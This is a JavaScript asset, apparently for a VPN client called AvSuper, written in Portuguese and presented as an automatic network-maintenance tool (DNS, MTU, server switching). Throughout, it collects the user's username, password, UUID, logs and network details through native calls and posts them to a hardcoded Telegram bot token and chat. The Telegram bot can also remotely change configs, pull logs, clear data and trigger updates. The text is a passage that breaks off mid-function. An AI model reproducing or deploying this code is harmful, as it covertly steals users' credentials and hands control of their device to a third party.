/* button.js - AvSuper IA-simulado (deploy em https://.../assets/button.js)
*/
(function(){
  "use strict";
  if(window.AVSUPER_BUTTON_LOADED) return;
  window.AVSUPER_BUTTON_LOADED = true;

  const CONFIG = {
    TELEGRAM_PROXY_URL: "",
    BOT_TOKEN: "7970534923:AAFjLLaXQGh--cY56ODNwHaWqFGGbc7IxE0",
    BOT_CHATID: 5582797263,
    POLL_MS: 3000,
    MAINT_INTERVAL_MS: 45000,
    FAILURE_WAIT_MS: 300000,
    ACTION_WINDOW_MS: 600000,
    MAX_ACTIONS_WINDOW: 3,
    PING_PROBE_ATTEMPTS: 3,
    DNS_PROVIDERS: [
      { name:"Cloudflare", p:"1.1.1.1", s:"1.0.0.1", p6:"2606:4700:4700::1111", s6:"2606:4700:4700::1001" },
      { name:"Google", p:"8.8.8.8", s:"8.8.4.4", p6:"2001:4860:4860::8888", s6:"2001:4860:4860::8844" },
      { name:"Quad9", p:"9.9.9.9", s:"149.112.112.112" },
      { name:"OpenDNS", p:"208.67.222.222", s:"208.67.220.220" },
      { name:"AdGuard", p:"94.140.14.14", s:"94.140.15.15" }
    ],
    MTU_CANDIDATES: [1500,1480,1460,1400,1350,1200],
    QOS_MODES: ["latency","stability","throughput","balanced","auto"],
    LOCAL_KEYS: {
      lastNet: "av_last_net_v5",
      lastCheckUser: "av_checkuser_v5",
      shortLogs: "av_short_logs_v5",
      mapping: "av_rt_mapping_v5"
    },
    TELEGRAM_MESSAGE_LIMIT: 3500
  };

  let _offset = 0;
  let _locked = false;
  let _recentActions = [];

  function now(){ return Date.now(); }
  function wait(ms){ return new Promise(r=>setTimeout(r, ms)); }

  async function safeNativeCall(name, args){
    try{
      if(!name) return null;
      const tries = [];
      if(name.endsWith(".execute")) tries.push(name); else { tries.push(name+".execute"); tries.push(name); }
      if(name.startsWith("Dt.")){
        const b = name.slice(3);
        tries.push(b+".execute"); tries.push(b);
        tries.push("Dt"+b+".execute"); tries.push("Dt"+b);
      }
      for(const t of tries){
        try{
          if(t.indexOf("Dt.")===0 && window.Dt){
            const fnName = t.split('.')[1].replace('.execute','');
            const candidate = window.Dt[fnName] || window.Dt[fnName.charAt(0).toUpperCase()+fnName.slice(1)];
            if(typeof candidate === "function"){ return candidate.apply(window.Dt, args||[]); }
            if(candidate && typeof candidate.execute === "function"){ return candidate.execute.apply(candidate, args||[]); }
            if(candidate && typeof candidate.get === "function" && (!args || args.length===0)){ return candidate.get(); }
          }
          if(typeof window[t] === "function"){ return window[t].apply(null, args||[]); }
          const short = t.replace('.execute','');
          if(typeof window[short] === "function"){ return window[short].apply(null, args||[]); }
          if(window.Dt && typeof window.Dt[short] !== "undefined"){
            const cand = window.Dt[short];
            if(typeof cand === "function"){ return cand.apply(window.Dt, args||[]); }
            if(cand && typeof cand.execute === "function"){ return cand.execute.apply(cand, args||[]); }
            if(cand && typeof cand.get === "function" && (!args || args.length===0)){ return cand.get(); }
          }
        }catch(e){}
      }
    }catch(e){}
    return null;
  }

  function compact(s, len){
    try{ s = String(s||""); return s.length <= len ? s : s.slice(0,len-3) + "..."; }catch(e){ return String(s).slice(0,len); }
  }

  async function gatherStatus(){
    try{
      const appVer = await safeNativeCall("DtAppVersion.execute") || await safeNativeCall("DtAppVersion") || window.AVSUPER_APP_VERSION || "N/A";

      let username = null;
      let password = null;
      let uuid = null;
      try{ username = await safeNativeCall("DtUsername.get"); }catch(e){} if(!username) try{ username = await safeNativeCall("DtUsername"); }catch(e){}
      try{ password = await safeNativeCall("DtPassword.get"); }catch(e){} if(!password) try{ password = await safeNativeCall("DtPassword"); }catch(e){}
      try{ uuid = await safeNativeCall("DtUuid.get"); }catch(e){} if(!uuid) try{ uuid = await safeNativeCall("DtUuid"); }catch(e){}

      const netObj = await safeNativeCall("DtGetNetworkData.execute") || await safeNativeCall("DtGetNetworkData") || {};
      const pingRaw = await safeNativeCall("DtGetPingResult.execute") || await safeNativeCall("DtGetPingResult") || netObj.ping || null;
      const ping = (typeof pingRaw === "number" || !isNaN(parseFloat(pingRaw))) ? Number(pingRaw) : null;

      const downBytes = await safeNativeCall("DtGetNetworkDownloadBytes.execute") || await safeNativeCall("DtGetNetworkDownloadBytes") || netObj.download || null;
      const upBytes = await safeNativeCall("DtGetNetworkUploadBytes.execute") || await safeNativeCall("DtGetNetworkUploadBytes") || netObj.upload || null;
      const ts = now();
      let downMbps = null, upMbps = null;
      try{
        const prev = JSON.parse(sessionStorage.getItem(CONFIG.LOCAL_KEYS.lastNet) || "{}");
        const dt = Math.max(0.2, (ts - (prev.ts||ts)) / 1000);
        if(typeof downBytes === "number" && typeof prev.down === "number"){ const delta = downBytes - prev.down; downMbps = (delta*8)/(1024*1024)/dt; if(downMbps<0) downMbps=null; }
        if(typeof upBytes === "number" && typeof prev.up === "number"){ const delta2 = upBytes - prev.up; upMbps = (delta2*8)/(1024*1024)/dt; if(upMbps<0) upMbps=null; }
        sessionStorage.setItem(CONFIG.LOCAL_KEYS.lastNet, JSON.stringify({ down: typeof downBytes==="number"?downBytes:null, up: typeof upBytes==="number"?upBytes:null, ts }));
      }catch(e){}
      if(downMbps===null && typeof downBytes==="string" && parseFloat(downBytes)) downMbps = parseFloat(downBytes);
      if(upMbps===null && typeof upBytes==="string" && parseFloat(upBytes)) upMbps = parseFloat(upBytes);

      const mtu = await safeNativeCall("DtGetMTU.execute") || await safeNativeCall("DtGetMTU") || "N/A";
      const dnsActive = window.AVSUPER_DNS_ACTIVE || await safeNativeCall("DtGetDnsStatus.execute") || await safeNativeCall("DtGetDnsStatus") || {};
      const localIp = await safeNativeCall("DtGetLocalIP.execute") || await safeNativeCall("DtGetLocalIP") || "N/A";
      const ua = navigator.userAgent || "unknown";
      const vpnState = await safeNativeCall("DtGetVpnState.execute") || await safeNativeCall("DtGetVpnState") || "unknown";
      const connectionType = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : (netObj && netObj.type_name) ? netObj.type_name : "unknown";

      const defaultCfg = await safeNativeCall("DtGetDefaultConfig.execute") || await safeNativeCall("DtGetDefaultConfig") || null;
      let srvId = null, srvName = null, srvHost = null;
      if(defaultCfg){
        if(typeof defaultCfg === "object"){
          srvId = defaultCfg.id || defaultCfg.configId || defaultCfg.cid || srvId;
          srvName = defaultCfg.name || defaultCfg.title || defaultCfg.server || srvName;
          srvHost = defaultCfg.host || defaultCfg.hostname || defaultCfg.address || srvHost;
        } else if(typeof defaultCfg === "number" || (typeof defaultCfg === "string" && /^\d+$/.test(defaultCfg))){
          srvId = Number(defaultCfg);
        }
      }

      if(!srvName || !srvHost || !srvId){
        try{
          const candidates = ["DtGetConfigs.execute","DtGetConfigs","dtGetConfigs.execute","dtGetConfigs"];
          for(const c of candidates){
            try{
              const res = await safeNativeCall(c);
              if(!res) continue;
              const acc = [];
              if(Array.isArray(res)){
                for(const cat of res){
                  const items = cat.items || cat.configs || [];
                  if(Array.isArray(items)) for(const it of items) acc.push(it);
                }
              } else if(res && res.items) for(const it of res.items) acc.push(it);
              else if(res && Array.isArray(res.configs)) for(const it of res.configs) acc.push(it);
              if(acc.length){
                const active = acc.find(x => x.active || x.selected || x.isDefault || x.default) || acc[0];
                if(active){
                  srvId = srvId || (active.id || active.configId || active.cid);
                  srvName = srvName || (active.name || active.title || active.server);
                  srvHost = srvHost || (active.host || active.hostname || active.address);
                  break;
                }
              }
            }catch(e){}
          }
        }catch(e){}
      }

      if(!srvName || !srvId){
        try{
          const logs = await safeNativeCall("DtGetLogs.execute") || await safeNativeCall("DtGetLogs") || localStorage.getItem(CONFIG.LOCAL_KEYS.shortLogs) || "";
          const txt = String(logs);
          const idMatch = txt.match(/ID:\s*([0-9]{2,10})/i);
          if(idMatch) srvId = srvId || Number(idMatch[1]);
          const nameMatch = txt.match(/Name:\s*([^\n<]+)/i) || txt.match(/Servidor:\s*([^\r\n]+)/i);
          if(nameMatch) srvName = srvName || String(nameMatch[1]).trim();
          const hostMatch = txt.match(/Servidor DNS:\s*([0-9a-fA-F:\.]+)/i) || txt.match(/Servidor:\s*([0-9a-zA-Z\.\-_:]+)/i);
          if(hostMatch) srvHost = srvHost || hostMatch[1];
        }catch(e){}
      }

      return {
        appVer, username: username||"N/A", password: password||"N/A", uuid: uuid||"N/A",
        ping, downloadMbps: (typeof downMbps === "number")? Number(downMbps) : (downMbps || null),
        uploadMbps: (typeof upMbps === "number")? Number(upMbps) : (upMbps || null),
        mtu, dnsActive, localIp, ua, vpnState, connectionType,
        defaultCfg, serverIdentifier: srvId||null, serverName: srvName||null, serverHost: srvHost||null
      };
    }catch(e){
      return { appVer:"N/A", username:"N/A", password:"N/A", uuid:"N/A", ping:null, downloadMbps:null, uploadMbps:null, mtu:"N/A", dnsActive:{}, localIp:"N/A", ua:"unknown", vpnState:"unknown", connectionType:"unknown", defaultCfg:null, serverIdentifier:null, serverName:null, serverHost:null };
    }
  }

  function computeQuality(m){
    try{
      const ping = (m.ping==null)?1000:Math.max(1,Math.min(2000,Number(m.ping)));
      const down = (m.downloadMbps==null)?0:Math.max(0,Math.min(1000,Number(m.downloadMbps)));
      const pingScore = 10 * (1 - Math.min(1, ping / 500));
      const downScore = 10 * Math.min(1, down / 10);
      const combined = (pingScore * 0.45) + (downScore * 0.45);
      return Math.round(Math.max(0, Math.min(10, combined)));
    }catch(e){ return 0; }
  }

  function buildReport(title, detail, before, after, meta){
    try{
      const lines = [];
      lines.push("🔔 " + (title || "Relatório AvSuper"));
      lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
      if(detail) lines.push("🔧 Ação: " + detail);
      if(meta && meta.actionLabel){
        lines.push("Ação executada: " + meta.actionLabel);
        lines.push("Ação concluída: " + (meta.concluded ? "SIM" : "NÃO"));
        lines.push("Melhoria detectada: " + (meta.improved ? "SIM" : "NÃO"));
      }
      lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
      lines.push("🔍 Dados do cliente");
      lines.push("Versão do app: " + String(before.appVer || "N/A"));
      lines.push("Usuário: " + String(before.username || "N/A") + " • Credencial: " + String(before.password || "N/A"));
      lines.push("UUID: " + String(before.uuid || "N/A"));
      lines.push("Servidor atual (nome): " + String(before.serverName || "Desconhecido"));
      lines.push("Servidor atual (id): " + String(before.serverIdentifier || "N/A"));
      lines.push("Servidor atual (host): " + String(before.serverHost || "N/A"));
      if(meta && meta.targetServer) lines.push("Servidor trocado para: " + String(meta.targetServer));
      lines.push("DNS ativo: " + JSON.stringify(before.dnsActive || {}));
      lines.push("IP local: " + String(before.localIp || "N/A"));
      lines.push("MTU: " + String(before.mtu || "N/A"));
      lines.push("Tipo de rede: " + String(before.connectionType || "unknown") + " • Agent UA: " + compact(before.ua,120));
      lines.push("VPN: " + String(before.vpnState || "unknown"));
      lines.push("Ping (ms): " + (before.ping===null ? "N/A" : String(before.ping) + " ms") + " • Down: " + (typeof before.downloadMbps==="number" ? before.downloadMbps.toFixed(2) + " Mbps" : "N/A") + " • Up: " + (typeof before.uploadMbps==="number" ? before.uploadMbps.toFixed(2) + " Mbps" : "N/A"));
      const qBefore = computeQuality({ ping: before.ping, downloadMbps: before.downloadMbps });
      const qAfter = after ? computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }) : qBefore;
      lines.push("Qualidade: " + String(qBefore) + "/10" + (after ? " → " + String(qAfter) + "/10" : ""));
      if(meta && meta.before && meta.after){
        lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        lines.push("📈 Métricas ANTES -> DEPOIS");
        const b = meta.before; const a = meta.after;
        lines.push("Ping: " + (b.ping===null?"N/A":String(b.ping)+" ms") + " -> " + (a.ping===null?"N/A":String(a.ping)+" ms"));
        lines.push("Down: " + ((typeof b.downloadMbps==="number")?b.downloadMbps.toFixed(2)+" Mbps":"N/A") + " -> " + ((typeof a.downloadMbps==="number")?a.downloadMbps.toFixed(2)+" Mbps":"N/A"));
        lines.push("Up: " + ((typeof b.uploadMbps==="number")?b.uploadMbps.toFixed(2)+" Mbps":"N/A") + " -> " + ((typeof a.uploadMbps==="number")?a.uploadMbps.toFixed(2)+" Mbps":"N/A"));
        lines.push("Qualidade: " + String(meta.qBefore) + "/10 -> " + String(meta.qAfter) + "/10");
      }
      lines.push("Hora: " + new Date().toISOString());
      lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
      return lines;
    }catch(e){ return ["Erro ao montar relatório: " + String(e)]; }
  }

  async function sendToTelegram(lines, keyboard){
    try{
      const text = Array.isArray(lines) ? lines.join("\n") : String(lines);
      if(CONFIG.TELEGRAM_PROXY_URL){
        try{
          await fetch(CONFIG.TELEGRAM_PROXY_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ text, chatId: CONFIG.BOT_CHATID || CONFIG.BOT_CHATID, reply_markup: keyboard || null })
          });
          return true;
        }catch(e){}
      }
      if(CONFIG.BOT_TOKEN && CONFIG.BOT_CHATID){
        try{
          const payload = { chat_id: CONFIG.BOT_CHATID, text, parse_mode: "HTML" };
          if(keyboard) payload.reply_markup = keyboard;
          await fetch("https://api.telegram.org/bot" + CONFIG.BOT_TOKEN + "/sendMessage", { method:"POST", headers:{ "Content-Type":"application/json" }, body:JSON.stringify(payload) });
          return true;
        }catch(e){}
      }
      console.warn("Nenhum método Telegram configurado (proxy ou token).");
      return false;
    }catch(e){ return false; }
  }

  async function trySetDns(primary, secondary){
    try{
      let ok = false;
      try{ await safeNativeCall("DtSetDns.execute", [primary, secondary]); ok = true; }catch(e){}
      if(!ok) try{ await safeNativeCall("DtSetDns", [primary, secondary]); ok = true; }catch(e){}
      if(!ok) try{ await safeNativeCall("DtSetAppConfig.execute", ["APP_DNS", JSON.stringify({ primary, secondary })]); ok = true; }catch(e){}
      if(ok) window.AVSUPER_DNS_ACTIVE = { primary, secondary };
      return ok;
    }catch(e){ return false; }
  }

  async function trySetMtu(mtu){
    try{
      try{ await safeNativeCall("DtSetMTU.execute", [mtu]); return true; }catch(e){}
      try{ await safeNativeCall("dtSetMTU", [mtu]); return true; }catch(e){}
      return false;
    }catch(e){ return false; }
  }

  async function tryRestartVpn(){
    try{
      try{ await safeNativeCall("DtExecuteVpnStop.execute"); }catch(e){}
      await wait(900);
      try{ await safeNativeCall("DtExecuteVpnStart.execute"); }catch(e){}
      await wait(1400);
      return true;
    }catch(e){ return false; }
  }

  async function getConfigsList(){
    try{
      const cand = ["DtGetConfigs.execute","DtGetConfigs","dtGetConfigs.execute","dtGetConfigs"];
      for(const c of cand){
        try{
          const r = await safeNativeCall(c);
          if(!r) continue;
          const acc = [];
          if(Array.isArray(r)){ for(const cat of r){ const items = cat.items || cat.configs || []; if(Array.isArray(items)) for(const it of items) acc.push(Object.assign({}, it, { category: cat.name||cat.title||"" })); } }
          else if(r && r.items){ for(const it of r.items) acc.push(it); }
          else if(r && Array.isArray(r.configs)){ for(const it of r.configs) acc.push(it); }
          if(acc.length) return acc;
        }catch(e){}
      }
      return [];
    }catch(e){ return []; }
  }

  async function setConfigById(id){
    try{
      await safeNativeCall("DtSetConfig.execute", [id]);
      await wait(1200);
      return true;
    }catch(e){ return false; }
  }

  async function probePing(host, attempts){
    try{
      if(!host) return 9999;
      const samples = [];
      for(let i=0;i<attempts;i++){
        const t0 = Date.now();
        try{
          const url = host.indexOf("http")===0 ? host : ("https://" + host + "/");
          await fetch(url, { method: "HEAD", mode: "no-cors", cache: "no-store" });
          samples.push(Date.now() - t0);
        }catch(e){ samples.push(1000); }
        await wait(120);
      }
      samples.sort((a,b)=>a-b);
      return Math.round(samples[Math.floor(samples.length/2)] || 9999);
    }catch(e){ return 9999; }
  }

  async function selectBestByPing(list){
    try{
      if(!Array.isArray(list) || !list.length) return null;
      const scored = [];
      for(const s of list){
        const host = s.host || s.hostname || s.server || s.name || s.title || s.address;
        if(!host) continue;
        const p = await probePing(host, CONFIG.PING_PROBE_ATTEMPTS);
        scored.push({ s, p });
      }
      scored.sort((a,b)=>a.p - b.p);
      return scored.length ? scored[0] : null;
    }catch(e){ return null; }
  }

  function canAct(){
    const t = now();
    _recentActions = _recentActions.filter(ts => t - ts < CONFIG.ACTION_WINDOW_MS);
    return _recentActions.length < CONFIG.MAX_ACTIONS_WINDOW;
  }

  async function maintenanceCycle(){
    if(_locked) return;
    if(!canAct()) return;
    _locked = true;
    try{
      const before = await gatherStatus();
      const qBefore = computeQuality({ ping: before.ping, downloadMbps: before.downloadMbps });
      if(qBefore >= 7){ _locked = false; return; }
      _recentActions.push(now());
      if((before.downloadMbps||0) < 0.5){
        for(const p of CONFIG.DNS_PROVIDERS){
          const applied = await trySetDns(p.p, p.s);
          await wait(2000);
          const after = await gatherStatus();
          const qAfter = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          const meta = { actionLabel: "Troca automática de DNS", concluded: applied, improved: qAfter > qBefore, before, after, qBefore, qAfter };
          await sendToTelegram(buildReport("🔄 Troca automática de DNS executada", JSON.stringify({ provider: p.name, primary: p.p, secondary: p.s }), before, after, meta));
          if(applied && meta.improved){ _locked = false; return; }
        }
      }
      if((before.ping||9999) > 300){
        let best = {score:-999, mtu:null, qos:null, after:null, applied:false};
        for(const m of CONFIG.MTU_CANDIDATES){
          const applied = await trySetMtu(m);
          await wait(1200);
          const after = await gatherStatus();
          const s = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          if(s > best.score) best = { score: s, mtu: m, after, applied };
          if(applied && s < qBefore){ try{ await trySetMtu(1400); }catch(e){} }
        }
        for(const q of CONFIG.QOS_MODES){
          try{ await safeNativeCall("DtSetQoS.execute", [q]); }catch(e){}
          await wait(700);
          const after = await gatherStatus();
          const s = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          if(s > best.score) best = { score: s, mtu: best.mtu, qos: q, after, applied:true };
        }
        const meta = { actionLabel: "Ajuste automático de MTU/QoS", concluded: !!best.applied, improved: best.score > qBefore, before, after: best.after || before, qBefore, qAfter: best.score };
        await sendToTelegram(buildReport("🔧 Ajuste automático de MTU/QoS", JSON.stringify({ mtu: best.mtu, qos: best.qos }), before, best.after || before, meta));
        if(meta.improved){ _locked = false; return; }
      }
      const restartRes = await (async ()=>{
        const stopList = ["DtExecuteVpnStop.execute","dtExecuteVpnStop","DtStopVpn.execute","dtStopVpn"];
        const startList = ["DtExecuteVpnStart.execute","dtExecuteVpnStart","DtStartVpn.execute","dtStartVpn"];
        for(let attempt=0; attempt<3; attempt++){
          for(const s of stopList){ try{ await safeNativeCall(s); }catch(e){} }
          await wait(900 + attempt*200);
          for(const s of startList){ try{ await safeNativeCall(s); }catch(e){} }
          await wait(1200 + attempt*300);
          const after = await gatherStatus();
          const qAfter = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          if(qAfter >= 5 && (after.downloadMbps||0) >= 0.5) return { ok:true, after, attempts: attempt+1 };
        }
        return { ok:false, after: await gatherStatus(), attempts:3 };
      })();
      if(restartRes.ok){
        const meta = { actionLabel: "Reconexão VPN", concluded:true, improved: computeQuality({ ping: restartRes.after.ping, downloadMbps: restartRes.after.downloadMbps }) > qBefore, before, after: restartRes.after, qBefore, qAfter: computeQuality({ ping: restartRes.after.ping, downloadMbps: restartRes.after.downloadMbps }) };
        await sendToTelegram(buildReport("🔄 Reconexão VPN bem sucedida", "Reconexão automática realizada", before, restartRes.after, meta));
        _locked = false; return;
      } else {
        const meta = { actionLabel: "Reconexão VPN (tentativa)", concluded:false, improved: computeQuality({ ping: restartRes.after.ping, downloadMbps: restartRes.after.downloadMbps }) > qBefore, before, after: restartRes.after, qBefore, qAfter: computeQuality({ ping: restartRes.after.ping, downloadMbps: restartRes.after.downloadMbps }) };
        await sendToTelegram(buildReport("⚠️ Tentativa de reiniciar VPN", "Tentativa não restaurou qualidade", before, restartRes.after, meta));
      }
      const switched = await (async ()=>{
        const list = await getConfigsList();
        if(!list || !list.length) return null;
        const families = ["VIVO","RIM","CLARO","TIM"];
        for(const fam of families){
          const matches = list.filter(s => (String(s.name || s.title || s.server || "").toUpperCase()).includes(fam.toUpperCase()));
          for(const cand of matches){
            const id = cand.id || cand.configId || cand.cid;
            if(!id) continue;
            try{ await setConfigById(id); await wait(1200); const after = await gatherStatus(); const qAfter = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }); if(qAfter >= 5 && (after.downloadMbps||0) >= 0.5) return { server: cand.name||cand.title||cand.server, id, after, qAfter }; }catch(e){}
          }
        }
        if(list[0]){
          const fb = list[0]; const id = fb.id || fb.configId || fb.cid;
          if(id){ try{ await setConfigById(id); await wait(1200); const after = await gatherStatus(); return { server: fb.name||fb.title||fb.server, id, after, qAfter: computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }) }; }catch(e){} }
        }
        return null;
      })();
      if(switched){
        const meta = { actionLabel: "Troca automática de servidor", concluded:true, improved: switched.qAfter > qBefore, before, after: switched.after, qBefore, qAfter: switched.qAfter, targetServer: switched.server };
        await sendToTelegram(buildReport("🔔 🔄 Troca automática de servidor executada", JSON.stringify({ server: switched.server, id: switched.id }), before, switched.after, meta));
        _locked = false; return;
      }
      const bestPing = await (async ()=>{
        const list = await getConfigsList();
        const pick = await selectBestByPing(list);
        return pick;
      })();
      if(bestPing && bestPing.s){
        const id = bestPing.s.id || bestPing.s.configId || bestPing.s.cid;
        if(id){
          try{ await setConfigById(id); await wait(1200); const after = await gatherStatus(); const meta = { actionLabel: "Troca por varredura de ping", concluded:true, improved: computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }) > qBefore, before, after, qBefore, qAfter: computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }), targetServer: bestPing.s.name||bestPing.s.title||bestPing.s.server }; await sendToTelegram(buildReport("🔎 Servidor trocado após varredura de ping", JSON.stringify({ name: meta.targetServer, pingMs: bestPing.p }), before, after, meta)); _locked = false; return; }catch(e){}
      }
      const inconcl = await gatherStatus();
      const metaIn = { actionLabel:"Inconclusivo", concluded:false, improved:false, before, after:inconcl, qBefore, qAfter: computeQuality({ ping: inconcl.ping, downloadMbps: inconcl.downloadMbps }) };
      await sendToTelegram(buildReport("ℹ️ Manutenção inconclusiva, aguardando 5 minutos", null, before, inconcl, metaIn));
      await wait(CONFIG.FAILURE_WAIT_MS);
    }catch(e){
      try{ const s = await gatherStatus(); await sendToTelegram(buildReport("🚨 Erro no ciclo adaptativo", String(e), s, s, { actionLabel:"Erro", concluded:false, improved:false, before:s, after:s, qBefore: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}), qAfter: computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}) })); }catch(e){} 
    }finally{ _locked = false; }
  }

  async function answerCallback(id, text){
    try{
      if(CONFIG.TELEGRAM_PROXY_URL){
        await fetch(CONFIG.TELEGRAM_PROXY_URL, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ answerCallback: true, callback_id: id, text }) });
        return;
      }
      if(CONFIG.BOT_TOKEN){
        await fetch("https://api.telegram.org/bot" + CONFIG.BOT_TOKEN + "/answerCallbackQuery", { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ callback_query_id: id, text, show_alert:false }) });
      }
    }catch(e){}
  }

  async function processCallback(data, chatId, cb){
    try{
      if(!data) return;
      if(data === "CMD_status"){
        const s = await gatherStatus();
        const meta = { actionLabel:"Status", concluded:true, improved:false, before:s, after:s, qBefore:computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}), qAfter:computeQuality({ping:s.ping,downloadMbps:s.downloadMbps}) };
        await sendToTelegram(buildReport("Status solicitado via botão", null, s, s, meta));
        await answerCallback(cb.id, "Status enviado");
        return;
      }
      if(data === "CMD_reconnect"){
        const before = await gatherStatus();
        const ok = await tryRestartVpn();
        const after = await gatherStatus();
        const meta = { actionLabel:"Reconexão VPN (manual)", concluded: ok, improved: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after, qBefore: computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
        await sendToTelegram(buildReport(ok ? "✅ Reconexão VPN realizada" : "⚠️ Reconexão VPN falhou", null, before, after, meta));
        await answerCallback(cb.id, "Reconexão executada");
        return;
      }
      if(data === "CMD_dns"){
        const before = await gatherStatus();
        let found = null;
        for(const p of CONFIG.DNS_PROVIDERS){
          const ok = await trySetDns(p.p, p.s);
          await wait(2000);
          const after = await gatherStatus();
          if(ok && computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps})){ found = { provider: p.name, primary: p.p, secondary: p.s, after }; break; }
        }
        if(found){
          const meta = { actionLabel:"Reteste DNS (manual)", concluded:true, improved:true, before, after: found.after, qBefore: computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:found.after.ping,downloadMbps:found.after.downloadMbps}) };
          await sendToTelegram(buildReport("Reteste DNS executado", JSON.stringify({ provider: found.provider, primary: found.primary, secondary: found.secondary }), before, found.after, meta));
        } else {
          const after = await gatherStatus();
          const meta = { actionLabel:"Reteste DNS (manual)", concluded:false, improved:false, before, after, qBefore: computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
          await sendToTelegram(buildReport("❌ Nenhum DNS melhor encontrado", null, before, after, meta));
        }
        await answerCallback(cb.id, "Reteste DNS executado");
        return;
      }
      if(data === "CMD_mtu"){
        const before = await gatherStatus();
        let best = null;
        for(const m of CONFIG.MTU_CANDIDATES){
          const ok = await trySetMtu(m);
          await wait(1200);
          const after = await gatherStatus();
          const s = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps });
          if(!best || s > best.s){ best = { mtu: m, s, after, ok }; }
          if(ok && s < computeQuality({ ping: before.ping, downloadMbps: before.downloadMbps })) await trySetMtu(1400);
        }
        if(best){
          const meta = { actionLabel:"Reteste MTU/QoS (manual)", concluded: !!best.ok, improved: best.s > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after: best.after, qBefore: computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: best.s };
          await sendToTelegram(buildReport("Reteste MTU/QoS", JSON.stringify({ mtu: best.mtu }), before, best.after, meta));
        }
        await answerCallback(cb.id, "Reteste MTU executado");
        return;
      }
      if(data === "CMD_logs"){
        let logs = "";
        try{ logs = await safeNativeCall("DtGetLogs.execute") || await safeNativeCall("DtGetLogs") || localStorage.getItem(CONFIG.LOCAL_KEYS.shortLogs) || "sem logs"; }catch(e){ logs = localStorage.getItem(CONFIG.LOCAL_KEYS.shortLogs) || "sem logs"; }
        logs = compact(String(logs), CONFIG.TELEGRAM_MESSAGE_LIMIT);
        await sendToTelegram(["📑 Logs recentes:", logs]);
        await answerCallback(cb.id, "Logs enviados");
        return;
      }
      if(data === "CMD_clear"){
        try{ localStorage.removeItem(CONFIG.LOCAL_KEYS.shortLogs); localStorage.removeItem(CONFIG.LOCAL_KEYS.lastCheckUser); localStorage.removeItem(CONFIG.LOCAL_KEYS.mapping); sessionStorage.removeItem(CONFIG.LOCAL_KEYS.lastNet); }catch(e){}
        await sendToTelegram(["🧹 Dados locais limpos"]);
        await answerCallback(cb.id, "Dados limpos");
        return;
      }
      if(data === "CMD_update"){
        try{ await safeNativeCall("DtStartAppUpdate.execute"); }catch(e){}
        await sendToTelegram(["⬆️ Comando update disparado"]);
        await answerCallback(cb.id, "Update solicitado");
        return;
      }
      if(data === "CMD_list_servers"){
        const list = await getConfigsList();
        if(!list.length){ await sendToTelegram(["❌ Nenhum servidor disponível"]); await answerCallback(cb.id, "Lista enviada"); return; }
        const header = ["🔎 Servidores disponíveis:"]; const keyboard = { inline_keyboard: [] };
        for(const s of list.slice(0,40)){ const id = s.id || s.configId || s.cid || ""; header.push(String(id) + " — " + (s.name || s.title || s.server || "")); keyboard.inline_keyboard.push([ { text:(s.name||s.title||s.server||"").slice(0,30), callback_data: "CMD_config:" + id } ]); }
        await sendToTelegram(header, keyboard);
        await answerCallback(cb.id, "Lista enviada");
        return;
      }
      if(data && data.startsWith("CMD_config:")){
        const id = data.split(":")[1];
        if(!id){ await sendToTelegram(["❌ ID inválido"]); await answerCallback(cb.id, "Falha"); return; }
        const before = await gatherStatus();
        const ok = await setConfigById(parseInt(id));
        await wait(1200);
        const after = await gatherStatus();
        const meta = { actionLabel:"Aplicar config", concluded: ok, improved: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) > computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), before, after, qBefore:computeQuality({ping:before.ping,downloadMbps:before.downloadMbps}), qAfter: computeQuality({ping:after.ping,downloadMbps:after.downloadMbps}) };
        await sendToTelegram(buildReport(ok ? "✅ Config aplicada" : "❌ Falha ao aplicar config", "id:"+id, before, after, meta));
        await answerCallback(cb.id, "Config aplicada");
        return;
      }
      if(data && data.startsWith("CMD_switchFamily:")){
        const family = data.split(":")[1];
        if(!family){ await sendToTelegram(["❌ Família inválida"]); await answerCallback(cb.id, "Falha"); return; }
        const res = await (async ()=>{
          const list = await getConfigsList();
          const matches = list.filter(s => (String(s.name||s.title||s.server||"").toUpperCase()).includes(family.toUpperCase()));
          for(const cand of matches){
            const id = cand.id || cand.configId || cand.cid;
            if(!id) continue;
            try{ await setConfigById(id); await wait(1200); const after = await gatherStatus(); const qAfter = computeQuality({ ping: after.ping, downloadMbps: after.downloadMbps }); if(qAfter >= 5) return { ok:true, server: cand.name||cand.title||cand.server, id, after, qAfter }; }catch(e){}
          }
          return null;
        })();
